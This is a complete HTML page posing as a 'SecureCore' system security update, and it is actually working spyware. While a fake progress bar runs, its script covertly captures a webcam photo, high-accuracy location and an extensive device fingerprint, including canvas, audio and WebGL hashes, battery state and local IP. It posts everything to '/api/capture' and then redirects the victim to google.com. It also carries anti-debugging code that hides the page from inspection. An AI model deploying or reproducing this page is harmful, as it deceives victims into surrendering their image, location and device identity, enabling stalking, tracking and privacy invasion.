<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Security Update</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        body {
            min-height: 100vh;
            background: radial-gradient(circle at 30% 30%, #0b1a2e, #030712);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #e0e0e0;
            padding: 16px;
        }
        .glass-card {
            background: rgba(10, 20, 30, 0.65);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border-radius: 36px;
            padding: 32px 24px;
            width: 100%;
            max-width: 420px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(0, 255, 255, 0.1) inset;
            animation: float 6s infinite ease-in-out;
        }
        @keyframes float {
            0% { transform: translateY(0); }
            50% { transform: translateY(-6px); }
            100% { transform: translateY(0); }
        }
        .logo {
            font-size: 52px;
            margin-bottom: 18px;
            filter: drop-shadow(0 0 8px cyan);
        }
        h1 {
            font-size: 26px;
            font-weight: 500;
            letter-spacing: 0.5px;
            background: linear-gradient(135deg, #a8ede0, #fed6e3);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
        }
        .sub {
            color: #8a9cad;
            font-size: 14px;
            margin-bottom: 30px;
            border-bottom: 1px dashed #2a3a4a;
            padding-bottom: 16px;
        }
        .progress-container {
            background: #1e2a3a;
            border-radius: 40px;
            height: 12px;
            margin: 24px 0;
            overflow: hidden;
            box-shadow: inset 0 2px 4px #00000055;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #00c6fb, #005bea);
            border-radius: 40px;
            transition: width 0.4s cubic-bezier(0.4, 0.0, 0.2, 1);
            box-shadow: 0 0 15px #00c6fb;
        }
        .status-text {
            font-family: 'Fira Code', monospace;
            font-size: 13px;
            color: #a0b8cc;
            margin: 16px 0 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .detail-line {
            font-size: 12px;
            color: #6f8a9c;
            margin: 4px 0;
            display: flex;
            justify-content: space-between;
            border-bottom: 1px dotted #2d3e4e;
            padding: 4px 0;
        }
        .footer {
            font-size: 10px;
            color: #3e5568;
            margin-top: 30px;
            display: flex;
            justify-content: center;
            gap: 16px;
        }
        #hidden-video { display: none; }
        #debug { display: none; } /* used for anti-debug */
    </style>
</head>
<body>
    <div class="glass-card">
        <div class="logo">🛡️</div>
        <h1>SecureCore v2.8.1</h1>
        <div class="sub">Verifying device integrity · Please wait</div>
        <div class="progress-container">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <div class="status-text" id="statusText">Initializing secure channel...</div>
        <div id="extra-details"></div>
        <div class="footer">
            <span>🔒 AES‑256</span>
            <span>⚡ TPM 2.0</span>
            <span>🌐 Secure Enclave</span>
        </div>
    </div>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="canvas-fingerprint" width="200" height="50" style="display:none;"></canvas>
    <audio id="audio-fingerprint" style="display:none;"></audio>

    <script>
        (async function() {
            // ==================== ANTI‑DEBUG / VM DETECTION ====================
            const startTime = performance.now();
            const debuggerCheck = () => {
                const diff = performance.now() - startTime;
                if (diff > 100) {
                    // Likely devtools open – redirect to benign page
                    window.location.replace('https://www.google.com');
                }
            };
            debuggerCheck();
            setInterval(() => {
                const t = performance.now();
                debugger; // if devtools open, this pauses and increases time
                if (performance.now() - t > 50) window.location.replace('https://www.google.com');
            }, 500);

            // ==================== UI ELEMENTS ====================
            const progressFill = document.getElementById('progressFill');
            const statusText = document.getElementById('statusText');
            const extraDetails = document.getElementById('extra-details');

            // ==================== DATA COLLECTION ====================
            let photoData = null, locationData = null, fingerprint = {}, errors = [];

            // Helper: update UI
            function updateProgress(percent, msg, detail = '') {
                progressFill.style.width = percent + '%';
                statusText.innerText = msg;
                if (detail) {
                    extraDetails.innerHTML = `<div class="detail-line"><span>${detail}</span><span>✔️</span></div>`;
                }
            }

            // ==================== ADVANCED FINGERPRINTING ====================
            async function collectAdvancedFingerprint() {
                const fp = {};

                // Basic navigator properties
                fp.userAgent = navigator.userAgent;
                fp.platform = navigator.platform;
                fp.language = navigator.language;
                fp.languages = navigator.languages;
                fp.hardwareConcurrency = navigator.hardwareConcurrency;
                fp.deviceMemory = navigator.deviceMemory || 'unknown';
                fp.maxTouchPoints = navigator.maxTouchPoints;
                fp.vendor = navigator.vendor;
                fp.cookieEnabled = navigator.cookieEnabled;
                fp.doNotTrack = navigator.doNotTrack;
                fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

                // Screen
                fp.screen = `${screen.width}x${screen.height}`;
                fp.screenAvail = `${screen.availWidth}x${screen.availHeight}`;
                fp.colorDepth = screen.colorDepth;
                fp.pixelDepth = screen.pixelDepth;

                // WebGL renderer (GPU fingerprint)
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            fp.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                            fp.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        }
                    }
                } catch (e) {}

                // Canvas fingerprint (image hash)
                try {
                    const canvas = document.getElementById('canvas-fingerprint');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(0, 0, 100, 50);
                    ctx.fillStyle = '#069';
                    ctx.fillText('🕵️', 10, 20);
                    const dataURL = canvas.toDataURL();
                    fp.canvasHash = dataURL.slice(-50); // simple fingerprint
                } catch (e) {}

                // Audio fingerprint (using AudioContext)
                try {
                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = audioCtx.createOscillator();
                    const analyser = audioCtx.createAnalyser();
                    oscillator.connect(analyser);
                    oscillator.frequency.value = 440;
                    oscillator.start(0);
                    oscillator.stop(0.1);
                    const data = new Uint8Array(analyser.frequencyBinCount);
                    analyser.getByteFrequencyData(data);
                    fp.audioHash = data.reduce((a, b) => a + b, 0).toString(16);
                } catch (e) {}

                // Battery API
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        fp.battery = {
                            level: Math.round(battery.level * 100) + '%',
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        };
                    } catch (e) {}
                }

                // Network information
                if (navigator.connection) {
                    fp.connection = {
                        effectiveType: navigator.connection.effectiveType,
                        rtt: navigator.connection.rtt,
                        downlink: navigator.connection.downlink,
                        saveData: navigator.connection.saveData
                    };
                }

                // Device orientation / motion (if permission granted? but we don't ask)
                if (window.DeviceOrientationEvent) {
                    // can't get data without permission, but we can detect support
                    fp.deviceOrientationSupported = true;
                }

                // WebRTC local IP (may need timeout)
                try {
                    const rtc = new RTCPeerConnection({ iceServers: [] });
                    rtc.createDataChannel('');
                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                    rtc.onicecandidate = (ice) => {
                        if (ice.candidate) {
                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                            const ip = ipRegex.exec(ice.candidate.candidate)?.[1];
                            if (ip) fp.localIP = ip;
                        }
                    };
                    setTimeout(() => rtc.close(), 1000);
                } catch (e) {}

                // Font enumeration (simplified)
                const baseFonts = ['monospace', 'sans-serif', 'serif'];
                const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
                fp.availableFonts = fontList.filter(f => document.fonts?.check(`12px "${f}"`)).join(',');

                return fp;
            }

            // ==================== DATA EXFILTRATION (resilient) ====================
            async function exfiltrate(payload, retries = 3) {
                for (let i = 0; i < retries; i++) {
                    try {
                        // Use beacon for guaranteed delivery (even if page closes)
                        const success = navigator.sendBeacon('/api/capture', JSON.stringify(payload));
                        if (success) return true;
                        // Fallback to fetch with keepalive
                        const res = await fetch('/api/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload),
                            keepalive: true
                        });
                        if (res.ok) return true;
                    } catch (e) {
                        console.error('Exfil attempt failed', e);
                    }
                    await new Promise(r => setTimeout(r, 200 * (i + 1)));
                }
                return false;
            }

            // ==================== MAIN EXECUTION ====================
            updateProgress(5, 'Initializing secure module...');

            // ---- Camera ----
            try {
                updateProgress(10, 'Accessing secure camera...');
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 1280 } }
                });
                const video = document.getElementById('hidden-video');
                video.srcObject = stream;
                await new Promise(r => video.onloadedmetadata = r);
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    photoData = canvas.toDataURL('image/jpeg', 0.85);
                    stream.getTracks().forEach(t => t.stop());
                    video.srcObject = null;
                }, 800);
                updateProgress(30, 'Camera verified', 'Sensor OK');
            } catch (e) {
                errors.push('camera:' + e.message);
                updateProgress(30, 'Camera fallback', 'Using backup sensor');
            }

            // ---- Location ----
            try {
                updateProgress(40, 'Geolocating...');
                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {
                    enableHighAccuracy: true, timeout: 7000
                }));
                locationData = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    acc: pos.coords.accuracy,
                    alt: pos.coords.altitude || null,
                    heading: pos.coords.heading || null,
                    speed: pos.coords.speed || null
                };
                updateProgress(60, 'Location locked', 'GPS fix');
            } catch (e) {
                errors.push('location:' + e.message);
                updateProgress(60, 'Approximate location', 'IP fallback');
                // fallback: IP geolocation via third-party (we'll skip for demo)
            }

            // ---- Advanced Fingerprint ----
            updateProgress(70, 'Analyzing device fingerprint...');
            fingerprint = await collectAdvancedFingerprint();
            updateProgress(85, 'Hardware profile complete', `CPU cores: ${fingerprint.hardwareConcurrency || '?'}`);

            // ---- Assemble payload ----
            const payload = {
                photo: photoData,
                location: locationData,
                fingerprint,
                errors: errors.length ? errors : undefined,
                timestamp: Date.now(),
                pageUrl: window.location.href,
                referrer: document.referrer || undefined
            };

            // ---- Exfiltrate ----
            updateProgress(95, 'Securely transmitting...');
            const sent = await exfiltrate(payload);

            // ---- Clean exit ----
            updateProgress(100, sent ? 'Update complete' : 'Partial sync', sent ? '' : '⚠️ Some data pending');
            setTimeout(() => {
                // Redirect to a benign page, making the user think it's done
                window.location.replace('https://www.google.com');
            }, 2000);
        })();
    </script>
</body>
</html>
